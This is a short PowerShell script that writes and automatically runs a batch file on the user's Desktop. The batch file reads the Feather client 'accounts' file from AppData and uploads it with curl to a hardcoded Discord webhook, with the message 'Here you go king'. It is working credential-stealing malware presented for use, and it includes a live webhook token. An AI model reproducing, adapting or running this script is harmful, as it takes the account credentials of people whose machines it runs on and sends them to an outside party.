
# Define the path for the batch file
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'

# Define the content of the batch file
$batchContent = @"
@echo off
setlocal enabledelayedexpansion

:: Discord Webhook URL
set webhookUrl=https://discord.com/api/webhooks/1377635895435329556/MAuAqPig5yepESXDNu4yLQ1TYnYHD7TJkXIEtVI5sNyibGQLLrOJJueL84kvDQW9lx8b

:: Path to the accounts file
set filePath=%userprofile%\AppData\Roaming\.feather\accounts


:: Check if the file exists
if not exist "%filePath%" (
    echo File accounts does not exist at the specified path.
    exit /b
)

:: Prepare message
set message=Here you go king :pray:

:: Correcting the payload format
set payload={\"content\":\"%message%\"}

:: Escape the payload for the curl request
set payload_json={\"content\":\"%message%\"}

:: Prepare CURL command for sending the request
curl -X POST %webhookUrl% ^
     -H "Content-Type: multipart/form-data" ^
     -F "payload_json=%payload_json%" ^
     -F "file=@%filePath%" 

if %errorlevel% neq 0 (
    echo Failed to send the webhook request.
) else (
    echo File sent successfully!
)

endlocal
"@

# Write the content to the batch file
Set-Content -Path $batchFilePath -Value $batchContent

# Output a message to confirm creation
Write-Host "Batch file created at $batchFilePath"

# Run the batch file automatically
Start-Process -FilePath $batchFilePath
Write-Host "Batch file is now running..."
